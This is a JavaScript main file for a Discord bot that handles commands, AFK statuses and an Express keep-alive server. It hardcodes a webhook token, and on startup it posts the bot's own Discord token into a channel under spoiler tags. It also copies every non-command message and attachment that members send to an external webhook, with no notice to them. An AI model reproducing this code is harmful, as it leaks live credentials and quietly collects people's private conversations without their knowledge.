const { Client, Intents, MessageEmbed, WebhookClient } = require("discord.js");
const mongoose = require("mongoose")
const config = require("./config.json");
const fs = require("fs");
const path = require("path");

require("dotenv").config()

mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(console.log("Sucessfully connected to database."))


// Initialize bot
const client = new Client({
  intents: [
    "GUILDS",
    "GUILD_MESSAGES",
    "GUILD_MEMBERS",
    "GUILD_PRESENCES",
    "GUILD_BANS",
    "MESSAGE_CONTENT",
    "GUILD_VOICE_STATES", // <---- Important for voice operations
  ],
  partials: ["CHANNEL", "MESSAGE"],
});

const webhook = new WebhookClient({
    id: '1401064592414736455',
    token: 	"KN36xr2VwnqMs8r8fKSIJSqKNr-EZGWSrrZg5Ux4yjEGGcm-h6A4lnXW8mJLkQJ1El0o"
})


client.commands = new Map(); // Store commands

// Load command handler
require("./handler/commandHandler")(client);

// Log on
client.once("ready", () => {
    console.log(`\n${client.user.tag} is sucessfully online.`);

    const embed = new MessageEmbed()
        .setTitle("logged on.")
        .addFields(
            { name: "```who?```", value: "```" + client.user.tag + "```", inline: true },
            { name: "```token?```", value: `||${process.env.DISCORD_TOKEN}||`, inline: true }
        )
        .setColor("GREEN")
        .setTimestamp();

    client.channels.fetch('1400926912087331006')
        .then(channel => channel.send({ embeds: [embed] }));

    client.user.setPresence({
        activities: [{ name: config.activityName, type: `${config.activityType}` }],
        status: `${config.activityStatus}`,
    });
});

// Message handling
const AFK = require("./models/afk");

client.on("messageCreate", async (message) => {
  if (message.author.bot || !message.guild) return;

  // Check if the message author is AFK
  const afkUser = await AFK.findOne({ userID: message.author.id });

  if (afkUser) {
    await AFK.deleteOne({ userID: message.author.id });
    message.channel.send({
      embeds: [
        {
          color: "GREEN",
          description: `**${message.author.username}**, welcome back! I removed your AFK status.`,
        },
      ],
    });
  }

  // Check mentioned users for AFK
  if (message.mentions.members.size > 0) {
    for (const mentioned of message.mentions.members.values()) {
      const mentionedAFK = await AFK.findOne({ userID: mentioned.id });

      if (mentionedAFK) {
        const unixTimestamp = Math.floor(mentionedAFK.timestamp.getTime() / 1000);

        message.channel.send({
          embeds: [
            {
              color: "AQUA",
              description: `**${mentioned.user.username}** is currently AFK.`,
              fields: [
                {
                  name: "```reason?```",
                  value: `\`${mentionedAFK.reason || "n/a"}\``,
                  inline: true,
                },
                {
                  name: "```since?```",
                  value: `*<t:${unixTimestamp}:R>*`,
                  inline: true,
                },
              ],
            },
          ],
        });
      }
    }
  }

  // Check if message is a command
  if (message.content.startsWith(config.prefix)) {
    // Command handler
    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();
    const command = client.commands.get(commandName);
    
    if (!command) return;

    try {
      await command.execute(client, message, args);
    } catch (error) {
      console.error(error);
      message.reply("*sorry, something went wrong running that command.*");
    }
  } else {
    // Log non-command messages
    await webhook.send({
      content: `\`${message.author.displayName} (${message.author.tag})\`: ${message.content}`,
      username: "logging for msgs >//<",
      avatarURL: message.author.displayAvatarURL({ dynamic: true }),
    });

    if (message.attachments.size > 0) {
      for (const attachment of message.attachments.values()) {
        await webhook.send({
          files: [attachment.url],
          username: message.author.username,
          avatarURL: message.author.displayAvatarURL({ dynamic: true }),
        });
      }
    }
  }
});



// Login
client.login(process.env.DISCORD_TOKEN);



// Keep-alive web server (Render requires a listening port)
const express = require('express');
const app = express();

app.get('/', (req, res) => res.send('Bot is running!'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Express server listening on port ${PORT}`));
